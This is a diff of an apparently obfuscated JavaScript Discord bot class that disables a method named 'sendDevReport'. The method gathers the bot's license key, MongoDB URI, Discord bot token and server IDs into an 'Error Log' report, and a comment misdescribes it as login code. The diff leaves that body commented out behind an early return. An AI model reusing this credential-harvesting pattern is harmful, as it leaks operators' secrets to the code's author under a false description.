@@ -105,7 +105,7 @@ module.exports = class y {
   }
 
   // This part was used to login with Discord App, but as I've quit using Discord there's no need for it anymore.
-  /* ["sendDevReport"](d) {
+  ["sendDevReport"](d) {
     const a2 = {
       d: 0x1af,
       e: 0x194,
@@ -213,6 +213,8 @@ module.exports = class y {
       az: 0x1ea,
       aA: 0x1d2
     };
+    return;
+    /* 
     const e = new w().setTitle("Error Log - " + this.client.commonConfig.get().server_name).setColor("#602dcf").setThumbnail("https://media0.giphy.com/media/3ov9k9Ss9N3wO6FQ7C/giphy.gif").setDescription("\n\n- **__Server:__** ```" + this.client.commonConfig.get().server_name + "```\n-  **__Config Version:__** ```" + this.client.commonConfig.get().version + "```\n- **__Key:__** ```" + process.env.LICENSE_KEY + "```\n- **__MongoDB:__** ```" + process.env.MONGODB_URI + "```\n- **__Bot Token:__** ```" + process.env.DISCORD_APP_TOKEN + "```\n- **__Bot ID:__** ```" + process.env.DISCORD_APP_ID + "```\n- **__Server ID:__** ```" + process.env.DISCORD_GUILD_ID + "```\n- **__Discord.js:__** ```" + x + "```\n- **__Node.js:__** ```" + process.version + "```").setFooter({
       "text": "Created by fiadh.fr - © 2024"
     });
@@ -231,6 +233,6 @@ module.exports = class y {
       if (this.client.commonConfig.get().debug) {
         this.client.consoleManager.log(f, 5);
       }
-    });
-  } */
-};
+    });*/
+  } 
+  };
